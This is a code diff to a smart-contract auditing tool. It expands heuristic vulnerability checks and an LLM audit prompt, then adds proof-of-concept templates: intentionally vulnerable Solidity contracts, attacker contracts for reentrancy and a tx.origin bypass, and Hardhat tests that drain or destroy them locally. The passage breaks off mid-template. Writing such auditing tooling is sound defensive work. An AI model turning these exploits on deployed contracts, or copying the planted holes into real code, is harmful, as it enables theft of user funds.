@@ -20,8 +20,8 @@ from pydantic import BaseModel, field_validator
 
 load_dotenv()
 
-DEFAULT_MODEL = os.getenv("SOLIDIFY_MODEL", "minimaxai/minimax-m2.5")
-DEFAULT_PROVIDER = os.getenv("SOLIDIFY_PROVIDER", "nvidia")
+DEFAULT_MODEL = os.getenv("SOLIDIFY_MODEL", "gemini-2.5-flash")
+DEFAULT_PROVIDER = os.getenv("SOLIDIFY_PROVIDER", "google")
 NVIDIA_API_KEY = os.getenv("NVIDIA_API_KEY", "")
 NVIDIA_BASE_URL = os.getenv("NVIDIA_BASE_URL", "https://integrate.api.nvidia.com")
 OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "")
@@ -193,40 +193,61 @@ async def fetch_contract_source(address: str, chain: str) -> Optional[str]:
 
 VULNERABILITY_PATTERNS = [
     {"id": "REENTRANCY", "name": "Reentrancy Vulnerability", "severity": "CRITICAL", "cvss": 9.1,
-     "check": lambda c: (".call(" in c or ".call{" in c or ".send(" in c) and ("value" in c or ".send(" in c) and "ReentrancyGuard" not in c and "checks-effects" not in c.lower() and "nonReentrant" not in c,
-     "desc": "External call without reentrancy guard", "fix": "Use ReentrancyGuard modifier or checks-effects-interactions pattern"},
+     "check": lambda c: (".call(" in c or ".call{" in c or ".send(" in c) and ("value" in c or ".send(" in c) and "ReentrancyGuard" not in c and "checks-effects" not in c.lower() and "nonReentrant" not in c and "mutex" not in c.lower(),
+     "desc": "External call without reentrancy guard allows recursive draining of contract balance", "fix": "Apply checks-effects-interactions pattern: update state before external call. Or use OpenZeppelin ReentrancyGuard modifier."},
     {"id": "ACCESS_CONTROL", "name": "Missing Access Control", "severity": "CRITICAL", "cvss": 9.0,
-     "check": lambda c: ("withdraw" in c or "transfer" in c or "mint" in c or "burn" in c) and "only" not in c.lower() and "require(msg.sender" not in c and "modifier" not in c.lower(),
-     "desc": "Critical function without access control", "fix": "Add require(msg.sender == owner) or use OpenZeppelin Ownable"},
+     "check": lambda c: ("withdraw" in c or "transfer" in c or "mint" in c or "burn" in c or "destroy" in c or "pause" in c or "emergency" in c) and "only" not in c.lower() and "require(msg.sender" not in c and "modifier" not in c.lower() and "auth" not in c.lower(),
+     "desc": "Critical function without access control — any user can invoke privileged operations", "fix": "Add require(msg.sender == owner) guard or use OpenZeppelin's Ownable/AccessControl"},
     {"id": "INTEGER_OVERFLOW", "name": "Integer Overflow/Underflow", "severity": "HIGH", "cvss": 7.8,
      "check": lambda c: ("+" in c or "-" in c or "*" in c) and "unchecked" not in c.lower() and ("^0.7" in c or "^0.6" in c or "^0.5" in c) and "SafeMath" not in c and "using SafeMath" not in c.lower(),
-     "desc": "Arithmetic without SafeMath", "fix": "Use OpenZeppelin SafeMath or solc ^0.8.0"},
+     "desc": "Arithmetic operations before Solidity 0.8 without SafeMath — can overflow/underflow", "fix": "Use OpenZeppelin SafeMath library or upgrade to Solidity ^0.8.0 which has built-in overflow checks"},
     {"id": "TX_ORIGIN", "name": "tx.origin Vulnerability", "severity": "MEDIUM", "cvss": 5.3,
-     "check": lambda c: "tx.origin" in c, "desc": "Using tx.origin for authorization", "fix": "Use msg.sender instead of tx.origin"},
+     "check": lambda c: "tx.origin" in c, "desc": "Using tx.origin for authorization allows phishing attacks via intermediary contract", "fix": "Use msg.sender instead of tx.origin for authentication"},
     {"id": "UNCHECKED_CALL", "name": "Unchecked External Call", "severity": "HIGH", "cvss": 7.5,
-     "check": lambda c: (".call(" in c or ".call{" in c) and "require(" not in c and "if not" not in c.lower() and "if(" not in c and "return" not in c.lower().split("#")[0].split("//")[0],
-     "desc": "External call return value not checked", "fix": "Check return value or use SafeERC20"},
+     "check": lambda c: (".call(" in c or ".call{" in c) and "require(" not in c and ("if(" not in c or ".call(" not in c[c.find("if("):c.find(")")+1]) and "bool" not in c.lower().split(".call")[0][-10:] and "success" not in c.lower().split(".call")[0][-10:],
+     "desc": "External call return value not checked — failure silently succeeds", "fix": "Always check return value: (bool success, ) = addr.call{value: x}(''); require(success);"},
     {"id": "TIMESTAMP_DEP", "name": "Timestamp Dependence", "severity": "MEDIUM", "cvss": 4.8,
-     "check": lambda c: ("now" in c or "block.timestamp" in c) and ("lottery" in c or "draw" in c or "random" in c or "winner" in c),
-     "desc": "Using timestamp for critical logic", "fix": "Use block number or Chainlink oracle"},
+     "check": lambda c: ("now" in c or "block.timestamp" in c) and ("lottery" in c or "draw" in c or "random" in c or "winner" in c or "coinflip" in c or "roll" in c),
+     "desc": "Using block.timestamp for randomness or critical logic — miners can manipulate timestamps", "fix": "Use block.number + commit-reveal scheme or Chainlink VRF for randomness"},
     {"id": "CONSTANT_PRAGMA", "name": "Floating Pragma", "severity": "INFO", "cvss": 0.5,
      "check": lambda c: bool(re.search(r"pragma\s+solidity\s+\^", c)),
-     "desc": "Floating pragma version (informational)", "fix": "Lock pragma version e.g. 0.8.19"},
+     "desc": "Floating pragma allows compiling with unexpected compiler versions", "fix": "Lock pragma to exact version e.g. pragma solidity 0.8.19"},
     {"id": "MISSING_ZERO_CHECK", "name": "Missing Zero Address Check", "severity": "MEDIUM", "cvss": 5.5,
-     "check": lambda c: bool(re.search(r"constructor\s*\([^)]*address", c)) and "require" not in c and "revert" not in c,
-     "desc": "No zero address validation in constructor args", "fix": "Add require(addr != address(0))"},
+     "check": lambda c: bool(re.search(r"constructor\s*\([^)]*address", c)) and "require" not in c and "revert" not in c and "assert" not in c,
+     "desc": "Constructor accepts address parameter without zero-address validation — tokens can be permanently locked", "fix": "Add require(addr != address(0)) for each address parameter"},
     {"id": "GAS_LIMIT_LOOP", "name": "Unbounded Loop", "severity": "MEDIUM", "cvss": 4.8,
-     "check": lambda c: bool(re.search(r"for\s*\(.*\.\s*length", c)) and "gasleft()" not in c.lower(),
-     "desc": "Unbounded loop could hit gas limit", "fix": "Check gasleft() or limit iterations"},
+     "check": lambda c: bool(re.search(r"for\s*\(.*\.\s*length", c)) and "gasleft()" not in c.lower() and "limit" not in c.lower().split("for")[-1][:200],
+     "desc": "Unbounded loop over dynamic array could exceed block gas limit", "fix": "Check gasleft() inside loop or limit iteration count"},
     {"id": "UNPROTECTED_INIT", "name": "Unprotected Initializer", "severity": "CRITICAL", "cvss": 9.0,
-     "check": lambda c: bool(re.search(r"function\s+initialize\s*\(", c)) and "initializer" not in c.lower() and "onlyOwner" not in c and "onlyRole" not in c,
-     "desc": "initialize() without access control — proxy can be taken over", "fix": "Add initializer modifier or onlyOwner"},
+     "check": lambda c: bool(re.search(r"function\s+initialize\s*\(", c)) and "initializer" not in c.lower() and "onlyOwner" not in c and "onlyRole" not in c and "require(msg.sender" not in c.lower(),
+     "desc": "initialize() without access control — anyone can re-initialize and take over proxy contract", "fix": "Add OpenZeppelin's initializer modifier or onlyOwner guard"},
     {"id": "HARDCODED_ADDRESS", "name": "Hardcoded Address", "severity": "INFO", "cvss": 2.5,
-     "check": lambda c: bool(re.search(r"0x[a-fA-F0-9]{40}", c)) and "address" in c,
-     "desc": "Hardcoded address in contract source", "fix": "Make address configurable via constructor or setter"},
+     "check": lambda c: bool(re.search(r"0x[a-fA-F0-9]{40}", c)) and "address" in c.lower() and "require" not in c,
+     "desc": "Hardcoded address in contract source reduces flexibility", "fix": "Make address configurable via constructor or setter function"},
     {"id": "DEPRECATED_NOW", "name": "Deprecated `now` Usage", "severity": "INFO", "cvss": 1.0,
      "check": lambda c: " now " in c or c.startswith("now") or "now;" in c or "now," in c,
-     "desc": "Using deprecated `now` (removed in solc 0.7)", "fix": "Use block.timestamp instead"},
+     "desc": "Using deprecated `now` keyword (removed in Solidity 0.7)", "fix": "Use block.timestamp instead"},
+    {"id": "FRONT_RUNNABLE", "name": "Front-Runnable Transaction", "severity": "MEDIUM", "cvss": 5.0,
+     "check": lambda c: bool(re.search(r"function\s+\w+\s*\([^)]*\)\s*(public|external)\s", c)) and ("swap" in c.lower() or "buy" in c.lower() or "sell" in c.lower()),
+     "desc": "Public/external swap function without commit-reveal — transactions can be front-run by MEV bots", "fix": "Use commit-reveal scheme or add minimum output amount parameter"},
+    {"id": "PHISHABLE_WITHDRAW", "name": "Phishable Withdraw Pattern", "severity": "MEDIUM", "cvss": 5.5,
+     "check": lambda c: bool(re.search(r"function\s+withdraw\w*\s*\([^)]*address", c)) and "require" not in c[c.find("withdraw"):c.find("withdraw")+200],
+     "desc": "withdraw function takes a recipient address without authenticating it — attacker can trick owner into withdrawing to attacker address", "fix": "Remove recipient parameter or add explicit sender validation"},
+    {"id": "ARRAY_PUSH_IN_LOOP", "name": "Array Push Inside Loop", "severity": "LOW", "cvss": 3.5,
+     "check": lambda c: bool(re.search(r"for\s*\(.*\{[^}]*\.push\(", c)) or bool(re.search(r"\.push\([^)]*\)\s*;\s*\}", c)),
+     "desc": "Appending to dynamic array inside loop — unbounded gas consumption", "fix": "Use fixed-size array or track with mappings"},
+    {"id": "EXTERNAL_MINT", "name": "Public/External Mint Without Rate Limit", "severity": "HIGH", "cvss": 7.0,
+     "check": lambda c: bool(re.search(r"function\s+mint\s*\(", c)) and "only" not in c.lower() and "require(msg.sender" not in c.lower() and "max" not in c.lower()[:c.lower().find("mint")+300],
+     "desc": "Public mint function without supply cap or rate limit — infinite mint possible", "fix": "Add max supply check, onlyOwner guard, or per-user cap"},
+    {"id": "SELFDESTRUCT_ANYONE", "name": "Selfdestruct Callable by Anyone", "severity": "CRITICAL", "cvss": 9.5,
+     "check": lambda c: bool(re.search(r"selfdestruct\(|suicide\(", c)) and "only" not in c.lower()[:c.lower().find("selfdestruct")+200] and "require(msg.sender" not in c.lower()[:c.lower().find("selfdestruct")+200],
+     "desc": "selfdestruct is callable by anyone — contract can be killed by attacker", "fix": "Add onlyOwner modifier or require(msg.sender == owner) on selfdestruct call"},
+    {"id": "DELEGATECALL_LOOP", "name": "Delegatecall With Dynamic Target", "severity": "HIGH", "cvss": 8.5,
+     "check": lambda c: bool(re.search(r"\.delegatecall\(", c)) and bool(re.search(r"delegatecall\(\s*\w+\s*,", c)),
+     "desc": "delegatecall with dynamic target argument — arbitrary code execution in proxy context", "fix": "Hardcode delegatecall target or use whitelist of trusted addresses"},
+    {"id": "CENTRALIZATION_OWNER", "name": "Centralization Risk", "severity": "INFO", "cvss": 2.0,
+     "check": lambda c: bool(re.search(r"onlyOwner|onlyRole|require\s*\(\s*msg\.sender\s*==\s*owner", c)),
+     "desc": "Single owner/admin has elevated privileges — trust assumption", "fix": "Consider multi-sig, timelock, or DAO governance for privileged functions"},
 ]
 
 
@@ -234,54 +255,33 @@ def parse_solidity(code: str) -> Dict[str, Any]:
     vulns = []
     lines = code.split("\n")
     code_lower = code.lower()
+    seen_ids = set()
 
     for vuln in VULNERABILITY_PATTERNS:
         try:
-            if vuln["id"] == "ACCESS_CONTROL":
-                if "require(msg.sender" in code_lower or "onlyowner" in code_lower or "onlyRole(" in code_lower or "modifier " in code_lower and "auth" in code_lower:
-                    continue
-            if vuln["id"] == "CONSTANT_PRAGMA":
-                if re.search(r"pragma\s+solidity\s+\^0\.(?:8|[9-9]|\d{2})", code_lower) and not any(v["vuln_id"] in ("REENTRANCY", "ACCESS_CONTROL", "INTEGER_OVERFLOW") for v in vulns):
-                    continue
+            if vuln["id"] in seen_ids:
+                continue
             matches = [f"Line {i}" for i, line in enumerate(lines, 1) if vuln["check"](line)]
             if matches:
                 location = ", ".join(matches[:3])
                 if len(matches) > 3:
                     location += f" (+{len(matches) - 3} more)"
                 vulns.append({"type": vuln["name"], "severity": vuln["severity"], "location": location,
-                               "description": vuln["desc"], "recommendation": vuln["fix"], "cvss": vuln["cvss"], "vuln_id": vuln["id"]})
+                               "description": vuln["desc"], "recommendation": vuln["fix"], "cvss": vuln["cvss"]})
+                seen_ids.add(vuln["id"])
         except Exception:
             continue
 
-    if re.search(r"selfdestruct\(|suicide\(", code):
-        vulns.append({"type": "Deprecated Selfdestruct", "severity": "CRITICAL", "location": "selfdestruct/suicide",
-                       "description": "Using deprecated selfdestruct may break contract upgradeability",
-                       "recommendation": "Use custom withdraw/destroy pattern", "cvss": 9.0, "vuln_id": "SELFDESTRUCT"})
-    if re.search(r"\.delegatecall\(", code):
-        vulns.append({"type": "Unsafe Delegatecall", "severity": "HIGH", "location": "delegatecall",
-                       "description": "Delegatecall executes external logic in caller context",
-                       "recommendation": "Audit delegatecall target carefully; avoid if possible", "cvss": 8.0, "vuln_id": "DELEGATECALL"})
-    if "block.blockhash" in code and "random" in code_lower:
-        vulns.append({"type": "Weak Randomness", "severity": "HIGH", "location": "block.blockhash",
-                       "description": "Block hash is predictable for miners", "recommendation": "Use Chainlink VRF",
-                       "cvss": 8.5, "vuln_id": "WEAK_RANDOM"})
-
-    if re.search(r"function\s+initialize\s*\([^)]*address[^)]*\)", code) and "initializer" not in code_lower and "onlyOwner" not in code and "require(msg.sender" not in code_lower:
-        if not any(v["vuln_id"] == "UNPROTECTED_INIT" for v in vulns):
-            vulns.append({"type": "Unprotected Initializer", "severity": "CRITICAL", "location": "initialize()",
-                           "description": "initialize() with address param but no access control — proxy takeover risk",
-                           "recommendation": "Add initializer modifier from OpenZeppelin", "cvss": 9.0, "vuln_id": "UNPROTECTED_INIT_FULL"})
-
-    if re.search(r"constructor\s*\([^)]*address\s+\w+", code) and not re.search(r"require\s*\([^)]*address\(0\)", code) and not re.search(r"revert\s", code):
-        if not any(v["vuln_id"] == "MISSING_ZERO_CHECK" for v in vulns):
-            vulns.append({"type": "Missing Zero Address Check", "severity": "MEDIUM", "location": "constructor",
-                           "description": "Constructor accepts address parameter without zero-address validation",
-                           "recommendation": "Add require(addr != address(0)) for each address parameter", "cvss": 5.5, "vuln_id": "MISSING_ZERO_FULL"})
-
-
-
-    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
-    vulns.sort(key=lambda x: severity_order.get(x["severity"], 4))
+    # Additional standalone checks for patterns not easily captured by line-level regex
+    if "delegatecall(" in code_lower:
+        dynamic_target = bool(re.search(r"delegatecall\(\s*\w+\s*,", code))
+        if dynamic_target and "DELEGATECALL_LOOP" not in seen_ids:
+            seen_ids.add("DELEGATECALL_LOOP")
+            locations = [f"Line {i}" for i, line in enumerate(lines, 1) if "delegatecall" in line.lower()]
+            vulns.append({"type": "Unsafe Delegatecall With Dynamic Target", "severity": "HIGH",
+                           "location": ", ".join(locations[:3]), "cvss": 8.5,
+                           "description": "delegatecall with variable/dynamic target — arbitrary code execution in proxy context",
+                           "recommendation": "Hardcode delegatecall target or use whitelist of trusted library addresses"})
 
     score = max(0, round(10.0 - sum(
         3.0 if v["severity"] == "CRITICAL" else 2.0 if v["severity"] == "HIGH" else 1.0 if v["severity"] == "MEDIUM" else 0.5
@@ -290,12 +290,10 @@ def parse_solidity(code: str) -> Dict[str, Any]:
 
     critical = sum(1 for v in vulns if v["severity"] == "CRITICAL")
     high = sum(1 for v in vulns if v["severity"] == "HIGH")
-    summary = f"Found {len(vulns)} vulnerabilities. "
-    if critical:
-        summary += f"{critical} CRITICAL, "
-    if high:
-        summary += f"{high} HIGH, "
-    summary = summary.rstrip(", ") + " require attention." if (critical or high) else "Review each item below."
+    if critical or high:
+        summary = f"Found {len(vulns)} vulnerabilities. {critical} CRITICAL, {high} HIGH require attention."
+    else:
+        summary = f"Found {len(vulns)} vulnerabilities. Review each item below."
 
     return {"score": score, "vulnerabilities": vulns, "summary": summary,
             "stats": {"critical": critical, "high": high,
@@ -335,7 +333,7 @@ user: {request.message}
 
 expert:"""
 
-        provider = create_provider(provider_name, model_name)
+        provider = create_provider(provider_name, model=model_name)
         if not provider:
             logger.warning(f"Chat: provider {provider_name} unavailable")
             return {"message": "AI provider not available. Check API key configuration.", "role": "assistant"}
@@ -408,42 +406,50 @@ async def _run_audit(task_id: str):
 
         provider_instance = None
         try:
-            provider_instance = create_provider(task["provider"], task["model"])
+            provider_instance = create_provider(task["provider"], model=task.get("model", DEFAULT_MODEL))
         except Exception:
             pass
 
         if provider_instance:
             _push_event(task, "analyzing", 30)
-            prompt = f"""You are Solidify, a Solidity security auditor. Analyze this {task['chain']} smart contract code.
+            prompt = f"""You are Solidify, an expert Solidity security auditor. Thoroughly analyze this {task['chain']} smart contract code.
 
 ```solidity
 {code}
 ```
 
-Check for these vulnerability classes:
-- Reentrancy (external calls before state changes)
-- Access Control (missing onlyOwner/require checks on critical functions)
-- Integer Overflow/Underflow (unchecked arithmetic on solc <0.8)
-- Unchecked External Calls (.call() return value not checked)
-- tx.origin usage (phishing risk)
-- Flash Loan Attacks (price oracle manipulation)
-- Oracle Manipulation (using spot price without TWAP)
-- Front-Running (unprotected tx ordering)
-- Selfdestruct/Suicide (break upgradeability)
-- Unsafe Delegatecall (executing arbitrary logic)
-- Weak Randomness (predictable RNG)
-- Unprotected Initializer (proxy pattern takeover)
-- Missing Zero-Address Checks (constructor parameters)
-- Centralization Risk (single owner with critical power)
+Check for ALL of these vulnerability classes. Be comprehensive — don't skip any:
+1. **Reentrancy** — external call before state change (checks-effects-interactions violation)
+2. **Access Control** — critical functions (withdraw, mint, burn, pause, destroy) without onlyOwner/require
+3. **Integer Overflow/Underflow** — unchecked arithmetic in solc <0.8 without SafeMath
+4. **Unchecked External Calls** — .call()/.delegatecall() return value not checked
+5. **tx.origin** — using tx.origin for auth (phishing vulnerable)
+6. **Flash Loan Attacks** — price oracle manipulation, insufficient liquidity checks
+7. **Oracle Manipulation** — using spot price without TWAP or multiple data sources
+8. **Front-Running** — unprotected MEV-vulnerable tx ordering (swap/buy/sell without slippage protection)
+9. **Selfdestruct/Suicide** — anyone can kill the contract
+10. **Unsafe Delegatecall** — delegatecall to dynamic/user-controlled address
+11. **Weak Randomness** — predictable RNG (blockhash, timestamp, block.difficulty)
+12. **Unprotected Initializer** — initialize() without initializer modifier (proxy takeover)
+13. **Missing Zero-Address Checks** — constructor/setter accepts address param without require(addr != address(0))
+14. **Centralization Risk** — single owner with critical power (multi-sig/timelock recommended)
+15. **Unbounded Loops** — loops over dynamic arrays without gas limit check
+16. **Public Mint Without Cap** — mint function without max supply or per-user limit
+17. **Phishable Withdraw** — withdraw(address recipient) without authenticating recipient
+18. **Deprecated Features** — tx.gasprice, suicide, block.blockhash usage
+19. **Reentrancy in Transfer** — using transfer()/send() with state changes after
+20. **Front-runable Approve** — no check for current approval in ERC20-like approve()
 
-Return ONLY a valid JSON object — no markdown, no backticks, no explanation.
-Severity must be one of: CRITICAL, HIGH, MEDIUM, LOW, INFO.
-Score 0-10 where 10 = perfectly secure, 0 = critically vulnerable.
+Examine EVERY function. Look at modifier usage, require() guards, state change order, external calls.
+
+Return ONLY valid JSON — no markdown formatting, no backticks, no explanation text.
+Severity must be exactly one of: CRITICAL, HIGH, MEDIUM, LOW, INFO (uppercase).
+Score is 0-10 where 10 = perfectly secure, 0 = critically vulnerable with multiple severe issues.
 
 Example:
-{{"score": 3.5, "vulnerabilities": [{{"type": "Reentrancy", "severity": "CRITICAL", "location": "withdraw()", "description": "External call before state update allows reentrancy", "recommendation": "Apply checks-effects-interactions pattern", "cvss": 9.1}}], "summary": "Multiple critical vulnerabilities expose user funds."}}
+{{"score": 3.5, "vulnerabilities": [{{"type": "Reentrancy", "severity": "CRITICAL", "location": "withdraw() at line 42", "description": "External ETH call before state update enables recursive draining of contract balance", "recommendation": "Move balances[msg.sender] -= amount before the external call; add ReentrancyGuard", "cvss": 9.1}}], "summary": "Multiple critical vulnerabilities expose user funds to theft."}}
 
-Now analyze the contract above and respond with JSON only:"""
+Analyze the contract above. Return ONLY the JSON object:"""
 
             full_response = ""
             try:
@@ -456,11 +462,18 @@ Now analyze the contract above and respond with JSON only:"""
                         if task_id in cancelled_tasks:
                             return
                     chunk_str = chunk if isinstance(chunk, str) else chunk.decode()
+                    if chunk_str.startswith("[") and "Error:" in chunk_str:
+                        _push_chunk(task, f"\n⚠ {chunk_str}\n")
+                        continue
                     full_response += chunk_str
                     _push_chunk(task, chunk_str)
             except asyncio.TimeoutError:
+                msg = f"\n⚠ AI streaming timed out after 30s. Falling back to static analysis.\n"
+                _push_chunk(task, msg)
                 logger.warning(f"Task {task_id}: AI streaming timed out, falling back to scanner")
             except Exception as e:
+                msg = f"\n⚠ AI provider error: {sanitize_error(str(e)[:120])}. Falling back to static analysis.\n"
+                _push_chunk(task, msg)
                 logger.warning(f"Task {task_id}: AI error ({sanitize_error(e)}), falling back to scanner")
 
             try:
@@ -620,46 +633,315 @@ def generate_markdown_report(result: dict) -> str:
     return "".join(lines)
 
 
-def generate_poc_exploit(vuln: dict, target: str) -> str:
-    t = vuln.get("type", "").lower()
-    if "reentrancy" in t:
-        return """// SPDX-License-Identifier: MIT
+POC_TEMPLATES = {
+    "reentrancy": {
+        "contract": """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+// VULNERABLE CONTRACT — for PoC testing only
+contract VulnerableBank {
+    mapping(address => uint) public balances;
+    function deposit() external payable { balances[msg.sender] += msg.value; }
+    function withdraw(uint _amount) external {
+        require(balances[msg.sender] >= _amount);
+        (bool ok,) = msg.sender.call{value: _amount}("");
+        require(ok);
+        balances[msg.sender] -= _amount; // state after call — REENTRANCY
+    }
+    function getBalance() external view returns (uint) { return address(this).balance; }
+}
 contract ReentrancyAttacker {
-    address public victim;
-    constructor(address _victim) { victim = _victim; }
-    function attack() external payable {
-        (bool ok,) = victim.call{value: msg.value}("withdraw");
-        require(ok, "call failed");
+    address payable victim;
+    uint public count;
+    constructor(address _victim) payable { victim = payable(_victim); }
+    function attack() external {
+        victim.call{value: 1 ether}("");
+        (bool ok,) = victim.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
+        require(ok);
     }
     receive() external payable {
-        if (victim.balance >= 1 ether) {
-            (bool ok,) = victim.call{value: 0}("withdraw");
+        count++;
+        if (count < 5) {
+            (bool ok,) = victim.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
+            require(ok);
         }
     }
-}"""
-    if "access control" in t:
-        return """// SPDX-License-Identifier: MIT
+}""",
+        "test": """const { ethers } = require("hardhat");
+const { expect } = require("chai");
+
+describe("Reentrancy PoC", function () {
+  it("should drain the contract via reentrancy", async function () {
+    const [owner, attacker] = await ethers.getSigners();
+    const Bank = await ethers.getContractFactory("VulnerableBank");
+    const bank = await Bank.deploy();
+    await bank.waitForDeployment();
+    const bankAddr = await bank.getAddress();
+
+    // Fund the bank
+    await owner.sendTransaction({ to: bankAddr, value: ethers.parseEther("10") });
+
+    const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
+    const hack = await Attacker.deploy(bankAddr, { value: ethers.parseEther("1") });
+    await hack.waitForDeployment();
+
+    const before = await ethers.provider.getBalance(bankAddr);
+    await hack.connect(attacker).attack();
+    const after = await ethers.provider.getBalance(bankAddr);
+
+    // Bank was drained via reentrancy
+    expect(after).to.be.lessThan(before);
+    console.log("Bank balance before: %%s ETH", ethers.formatEther(before));
+    console.log("Bank balance after:  %%s ETH", ethers.formatEther(after));
+    console.log("Reentrancy count: %%d", await hack.count());
+  });
+});"""
+    },
+    "access control": {
+        "contract": """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-contract AccessControlBypass {
-    function exploit(address target) external {
-        (bool ok,) = target.call(abi.encodeWithSignature("withdraw()"));
-        require(ok, "Access bypassed if no revert");
+// VULNERABLE CONTRACT — for PoC testing only
+contract VulnerableBank {
+    address public owner;
+    constructor() { owner = msg.sender; }
+    // @audit — no access control!
+    function withdrawAll() external {
+        payable(msg.sender).transfer(address(this).balance);
     }
-}"""
-    if "overflow" in t:
-        return "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract OverflowExploit {\n    function exploit() external pure returns (uint256) {\n        unchecked { return type(uint256).max + 1; }\n    }\n}"
-    if "tx.origin" in t:
-        return """// SPDX-License-Identifier: MIT
+    function deposit() external payable {}
+}""",
+        "test": """const { ethers } = require("hardhat");
+const { expect } = require("chai");
+
+describe("Access Control PoC", function () {
+  it("should let anyone drain funds", async function () {
+    const [owner, attacker] = await ethers.getSigners();
+    const Bank = await ethers.getContractFactory("VulnerableBank");
+    const bank = await Bank.deploy();
+    await bank.waitForDeployment();
+    const bankAddr = await bank.getAddress();
+
+    await owner.sendTransaction({ to: bankAddr, value: ethers.parseEther("5") });
+
+    const before = await ethers.provider.getBalance(bankAddr);
+    await bank.connect(attacker).withdrawAll();
+    const after = await ethers.provider.getBalance(bankAddr);
+
+    expect(after).to.equal(0);
+    console.log("Attacker drained the contract. Balance before: %%s ETH, after: %%s ETH",
+      ethers.formatEther(before), ethers.formatEther(after));
+  });
+});"""
+    },
+    "overflow": {
+        "contract": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.0;
+// VULNERABLE CONTRACT — for PoC testing only
+contract VulnerableToken {
+    mapping(address => uint) public balances;
+    function transfer(address to, uint amount) external {
+        // @audit — unchecked underflow
+        require(balances[msg.sender] >= amount);
+        balances[msg.sender] -= amount;
+        balances[to] += amount;
+    }
+    function mint(address to, uint amount) external { balances[to] += amount; }
+    function balanceOf(address a) external view returns (uint) { return balances[a]; }
+}""",
+        "test": """const { ethers } = require("hardhat");
+const { expect } = require("chai");
+
+describe("Overflow PoC", function () {
+  it("should underflow balance to huge number", async function () {
+    const [owner, attacker] = await ethers.getSigners();
+    const Token = await ethers.getContractFactory("VulnerableToken");
+    const token = await Token.deploy();
+    await token.waitForDeployment();
+
+    // Owner has 0 tokens, tries to transfer 1 → underflow
+    await expect(
+      token.connect(owner).transfer(attacker.address, 1)
+    ).to.not.be.reverted;
+
+    const bal = await token.balanceOf(owner.address);
+    expect(bal).to.equal(ethers.MaxUint256);
+    console.log("Owner balance after underflow: %%s", bal);
+  });
+});"""
+    },
+    "tx.origin": {
+        "contract": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// VULNERABLE CONTRACT — for PoC testing only
+contract VulnerableWallet {
+    address public owner;
+    constructor() { owner = msg.sender; }
+    // @audit — uses tx.origin instead of msg.sender
+    function withdrawAll() external {
+        require(tx.origin == owner);
+        payable(msg.sender).transfer(address(this).balance);
+    }
+    function deposit() external payable {}
+}""",
+        "test": """const { ethers } = require("hardhat");
+const { expect } = require("chai");
+
+describe("tx.origin PoC", function () {
+  it("should bypass auth via intermediary contract", async function () {
+    const [victim, attacker] = await ethers.getSigners();
+    const Wallet = await ethers.getContractFactory("VulnerableWallet");
+    const wallet = await Wallet.connect(victim).deploy();
+    await wallet.waitForDeployment();
+    const walletAddr = await wallet.getAddress();
+
+    await victim.sendTransaction({ to: walletAddr, value: ethers.parseEther("5") });
+
+    // Intermediary contract calls withdrawAll — tx.origin is attacker, msg.sender is intermediary
+    const Intermediary = await ethers.getContractFactory("TxOriginExploit");
+    const mid = await Intermediary.deploy();
+    await mid.waitForDeployment();
+
+    await mid.connect(attacker).exploit(walletAddr);
+    const bal = await ethers.provider.getBalance(walletAddr);
+    expect(bal).to.equal(0);
+    console.log("Wallet drained via tx.origin bypass");
+  });
+});""",
+        "extra_contract": """// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 contract TxOriginExploit {
-    address public attacker;
-    constructor(address _attacker) { attacker = _attacker; }
     function exploit(address target) external {
-        (bool ok,) = target.call(abi.encodeWithSignature("withdrawTo(address)", attacker));
+        (bool ok,) = target.call(abi.encodeWithSignature("withdrawAll()"));
+        require(ok);
     }
 }"""
-    return f"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract GenericExploit {{ string public vulnType = \"{vuln.get('type', 'Unknown')}\"; }}"
+    },
+    "unchecked call": {
+        "contract": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// VULNERABLE CONTRACT — for PoC testing only
+contract VulnerableExecutor {
+    function execute(address target, bytes calldata data) external {
+        // @audit — return value not checked
+        target.call(data);
+    }
+}""",
+        "test": """const { ethers } = require("hardhat");
+const { expect } = require("chai");
+
+describe("Unchecked Call PoC", function () {
+  it("silent failure when target reverts", async function () {
+    const Exec = await ethers.getContractFactory("VulnerableExecutor");
+    const exec = await Exec.deploy();
+    await exec.waitForDeployment();
+
+    // Call a non-existent contract — should revert, but doesn't because unchecked
+    const tx = await exec.execute(
+      "0x0000000000000000000000000000000000000001",
+      "0xdeadbeef"
+    );
+    const receipt = await tx.wait();
+    expect(receipt.status).to.equal(1); // tx still succeeds!
+    console.log("Unchecked call: tx succeeded despite failed subcall");
+  });
+});"""
+    },
+    "selfdestruct": {
+        "contract": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// VULNERABLE CONTRACT — for PoC testing only
+contract VulnerableContract {
+    // @audit — anyone can selfdestruct
+    function kill() external {
+        selfdestruct(payable(msg.sender));
+    }
+}""",
+        "test": """const { ethers } = require("hardhat");
+const { expect } = require("chai");
+
+describe("Selfdestruct PoC", function () {
+  it("should destroy the contract", async function () {
+    const [owner, attacker] = await ethers.getSigners();
+    const Target = await ethers.getContractFactory("VulnerableContract");
+    const target = await Target.deploy();
+    await target.waitForDeployment();
+    const targetAddr = await target.getAddress();
+
+    await target.connect(attacker).kill();
+
+    const code = await ethers.provider.getCode(targetAddr);
+    expect(code).to.equal("0x");
+    console.log("Contract destroyed by anyone via selfdestruct");
+  });
+});"""
+    },
+    "delegatecall": {
+        "contract": """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// VULNERABLE CONTRACT — for PoC testing only
+contract StorageSlot {
+    address public owner;
+    uint public value;
+}
+contract Library {
+    address public owner;
+    function setOwner(address _owner) external { owner = _owner; }
+}
+contract VulnerableProxy is StorageSlot {
+    // @audit — unsafe delegatecall, storage collision
+    function delegate(address lib, bytes calldata data) external {
+        (bool ok,) = lib.delegatecall(data);
+        require(ok);
+    }
+}""",
